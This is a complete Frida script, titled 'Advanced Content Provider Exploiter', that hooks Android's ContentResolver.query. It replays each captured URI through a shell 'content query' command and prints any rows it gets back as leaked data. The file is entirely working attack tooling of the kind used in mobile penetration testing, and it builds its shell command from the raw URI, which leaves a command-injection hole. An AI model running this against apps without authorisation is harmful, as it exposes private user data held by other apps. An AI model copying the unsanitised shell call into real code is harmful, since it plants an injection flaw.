Java.perform(function () {
    console.log("\n[!] Advanced Content Provider Exploiter Started...");
    console.log("[*] Monitoring URIs and testing cross-app access...");
    
    var ContentResolver = Java.use('android.content.ContentResolver');
    var Runtime = Java.use('java.lang.Runtime');
    var Scanner = Java.use('java.util.Scanner');

    ContentResolver.query.overload('android.net.Uri', '[Ljava.lang.String;', 'android.os.Bundle', 'android.os.CancellationSignal').implementation = function (uri, projection, queryArgs, cancellationSignal) {
        
        var uriString = uri.toString();
        console.log("\n" + "=".repeat(50));
        console.log("[CAPTURED]: " + uriString);

        try {
            var cmd = "content query --uri " + uriString;
            var process = Runtime.getRuntime().exec(["sh", "-c", cmd]);
            var inputStream = process.getInputStream();
            
            var scanner = Scanner.$new(inputStream);
            scanner.useDelimiter("\\A");
            
            var output = "";
            if (scanner.hasNext()) {
                output = scanner.next();
            }

            if (output.length > 0 && output.indexOf("No result found") === -1) {
                console.log("[!!!] STATUS: VULNERABLE");
                console.log("[!!!] DATA LEAKED:\n" + output.trim());
            } else if (output.indexOf("Permission Denial") !== -1 || output.indexOf("requires") !== -1) {
                console.log("[+] STATUS: SECURE (Permission Denied)");
            } else {
                console.log("[-] STATUS: SECURE (No Data or Access Blocked)");
            }

        } catch (e) {
            console.log("[-] Test Failed: " + e.message);
        }

        return this.query(uri, projection, queryArgs, cancellationSignal);
    };
});